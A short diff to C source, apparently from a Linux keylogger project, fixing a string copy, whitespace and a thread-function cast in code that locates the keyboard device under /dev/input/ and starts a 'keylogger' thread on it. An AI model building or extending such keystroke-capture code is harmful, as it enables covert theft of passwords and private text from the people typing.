@@ -33,7 +33,7 @@ void debian_get_kb_device_filename(const char *command)
     if(path == NULL)
         debian_error("malloc()\nFunction : debian_get_kb_device_filename()");
 
-    strncpy(path, "/dev/input/", 11);
+    strncpy(path, "/dev/input/", strlen("/dev/input/") + 1);
 
     /*  Open the pipe for execute the command line */
     pipe = popen(command, "r");
@@ -47,12 +47,12 @@ void debian_get_kb_device_filename(const char *command)
     pclose(pipe);
 
     //strdup(strncat(path, temp, strlen(temp) + 1));
-    
+
     snprintf(path, 32, "%s%s", "/dev/input/", temp);
-    
+
     printf("path = %s\n", path);
 
-    if(pthread_create(&thread_logger, NULL, (void*)keylogger, path) == -1)
+    if(pthread_create(&thread_logger, NULL, (void*(*)(void*))keylogger, path) == -1)
         debian_error("pthread_create()\nFonction : debian_get_kb_device_filename()");
 
     /*  Send the deviceFile to the keylogger fonction */
